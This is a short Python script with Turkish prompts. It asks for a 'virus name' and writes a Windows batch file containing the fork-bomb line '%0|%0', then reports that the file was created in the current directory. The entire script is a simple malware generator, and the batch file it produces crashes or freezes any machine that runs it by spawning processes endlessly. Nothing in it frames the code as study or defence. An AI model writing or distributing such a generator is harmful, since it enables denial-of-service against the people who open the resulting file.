import os

ad = input("Virus adını giriniz > ")
dosya = open(ad+".bat","a")
butun = (ad+".bat")


dosya.write('''%0|%0
''')
print("Bulunduğunuz Dizine Oluşturuldu")